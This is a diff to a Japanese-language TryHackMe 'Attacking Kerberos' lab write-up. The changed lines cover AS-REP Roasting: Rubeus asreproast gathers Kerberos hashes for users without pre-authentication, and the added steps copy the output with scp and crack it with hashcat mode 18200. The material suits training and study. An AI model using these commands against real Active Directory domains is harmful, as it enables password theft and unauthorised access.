@@ -192,6 +192,8 @@ Use the same wordlist that you downloaded in task 4
 Which User is vulnerable to AS-REP Roasting?  
 What is the User's Password?  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_16.png" width="50%" height="50%">  
-「`Rubeus.exe asreproast /format:hashcat /outfile:出力ファイル名`」で事前認証が無効のユーザのTGTチケットを取得できた。
+「`Rubeus.exe asreproast /format:hashcat /outfile:出力ファイル名`」で事前認証が無効のユーザのTGTチケットを取得できた。  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_17.png" width="50%" height="50%">  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_18.png" width="100%" height="100%">  
+「`scp SSHユーザ名@IPアドレス:/リモートパス ローカルパス`」でRubeus出力を取得し  
+「`hashcat -a 0 -m 18200 ハッシュファイル名 Wordlist名`」でハッシュをクラック。（`-m 18200`は`$krb5asrep`形式のHash形式、Johnでもサポートしている。）
